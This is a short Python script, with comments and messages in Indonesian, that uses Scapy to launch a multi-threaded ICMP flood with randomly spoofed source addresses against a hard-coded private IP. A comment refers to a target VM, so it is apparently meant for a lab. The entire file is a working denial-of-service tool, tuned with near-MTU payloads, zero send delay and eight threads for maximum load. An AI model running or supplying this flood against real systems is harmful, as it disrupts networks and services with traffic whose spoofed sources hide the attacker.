from scapy.all import IP, ICMP, Raw, send, RandIP
import threading
import time

# Ganti dengan IP VM Target Anda
target_ip = "192.168.0.118"

# Konfigurasi multi-threading
NUM_THREADS = 8
PACKETS_PER_BATCH = 50
PAYLOAD_SIZE = 1400  # Bytes (near-MTU for maximum impact)

print(f"--- Memulai ICMP Flood Attack (Multi-threaded) ke {target_ip} ---")
print(f"Threads: {NUM_THREADS} | Batch Size: {PACKETS_PER_BATCH} packets | Payload: {PAYLOAD_SIZE} bytes")
print("Tekan Ctrl+C untuk berhenti.")

stop_attack = False

def attack_thread(thread_id):
    """Thread function untuk mengirim batch paket ICMP"""
    global stop_attack
    
    # Pre-build packet batch untuk efisiensi
    payload = Raw(load="X" * PAYLOAD_SIZE)
    packets = []
    for _ in range(PACKETS_PER_BATCH):
        packet = IP(src=RandIP(), dst=target_ip) / ICMP() / payload
        packets.append(packet)
    
    print(f"[Thread {thread_id}] Started")
    
    while not stop_attack:
        try:
            # Kirim batch paket sekaligus dengan inter=0 untuk kecepatan maksimal
            send(packets, verbose=0, inter=0)
        except Exception as e:
            if not stop_attack:
                print(f"[Thread {thread_id}] Error: {e}")
            break

try:
    # Buat dan jalankan thread
    threads = []
    for i in range(NUM_THREADS):
        thread = threading.Thread(target=attack_thread, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    # Keep main thread alive
    while True:
        time.sleep(1)

except KeyboardInterrupt:
    print("\n--- Menghentikan serangan... ---")
    stop_attack = True
    time.sleep(2)  # Beri waktu thread untuk berhenti
    print("--- Serangan dihentikan ---")

